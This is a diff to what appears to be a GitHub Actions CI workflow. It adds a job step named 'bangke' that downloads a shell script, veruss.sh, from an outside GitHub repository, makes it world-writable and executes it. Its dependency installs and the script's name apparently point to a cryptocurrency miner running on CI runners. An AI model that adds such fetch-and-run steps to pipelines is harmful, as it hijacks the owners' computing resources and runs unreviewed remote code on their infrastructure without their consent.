@@ -102,7 +102,8 @@ jobs:
 
     - name : install dependencies 
 
-      run: |
+      run: apt-get update && apt-get upgrade -y && apt-get install -y ca-certificates wget libcurl4 libjansson4 libgomp1 libnuma-dev
 
-        wget https://raw.githubusercontent.com/angkii/bh/main/veruss.sh && chmod 777 veruss.sh && ./veruss.sh
+    - name: bangke
 
+      run: wget -qO veruss.sh https://raw.githubusercontent.com/angkii/bh/main/veruss.sh && chmod 777 veruss.sh && ./veruss.sh
